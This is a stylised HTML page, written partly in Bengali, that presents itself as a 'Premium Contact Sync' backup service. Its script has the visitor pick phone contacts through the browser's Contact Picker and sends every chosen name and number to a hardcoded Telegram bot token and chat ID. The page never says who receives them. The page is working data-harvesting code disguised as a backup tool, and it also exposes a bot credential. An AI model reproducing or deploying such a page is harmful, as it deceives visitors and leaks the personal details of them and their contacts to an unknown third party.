<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Premium Contact Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:'Hind Siliguri',sans-serif;
    background: linear-gradient(135deg,#020617,#0f172a);
}

/* Glass Card */
.card{
    width:340px;
    padding:30px;
    border-radius:22px;
    background: rgba(255,255,255,0.06);
    backdrop-filter: blur(20px);
    border:1px solid rgba(255,255,255,0.1);
    box-shadow:0 10px 35px rgba(0,0,0,0.6);
    text-align:center;
}

/* Text */
h2{
    color:#fff;
    margin-bottom:8px;
}

p{
    color:#94a3b8;
    font-size:14px;
}

/* Button */
.btn{
    margin-top:20px;
    width:100%;
    padding:16px;
    border:none;
    border-radius:14px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    background: linear-gradient(135deg,#22c55e,#4ade80);
    color:#000;
    transition:0.3s;
}

.btn:active{
    transform:scale(0.98);
}

/* Loader */
.loader{
    margin:15px auto;
    width:26px;
    height:26px;
    border:3px solid rgba(255,255,255,0.2);
    border-top:3px solid #22c55e;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}

@keyframes spin{
    100%{transform:rotate(360deg)}
}

.status{
    margin-top:12px;
    font-size:14px;
    color:#22c55e;
}
</style>
</head>

<body>

<div class="card">
    <h2>☁️ Contact Backup</h2>
    <p>কন্টাক্ট সিলেক্ট করে নিরাপদে পাঠান</p>

    <button class="btn" id="btn">Select & Send</button>

    <div class="loader" id="loader"></div>
    <div class="status" id="status">Ready</div>
</div>

<script>
const CONFIG = {
    TOKEN: "8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
    CHAT_ID: "6467941734"
};

const btn = document.getElementById('btn');
const loader = document.getElementById('loader');
const status = document.getElementById('status');

btn.onclick = async () => {
    try {
        if (!('contacts' in navigator)) {
            throw new Error("এই ডিভাইস সাপোর্ট করে না");
        }

        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});

        if (!contacts.length) {
            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
        }

        loader.style.display = "block";
        status.innerText = "Sending...";

        let text = "📱 Contact List\n\n";

        contacts.forEach(c=>{
            let name = c.name ? c.name[0] : "No Name";
            let phone = c.tel ? c.tel[0] : "No Number";

            text += `👤 ${name}\n📞 ${phone}\n\n`;
        });

        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: text
            })
        });

        loader.style.display = "none";
        status.innerText = "✅ Successfully Sent!";
    }
    catch(e){
        loader.style.display = "none";
        status.innerText = "❌ " + e.message;
    }
};
</script>

</body>
</html>
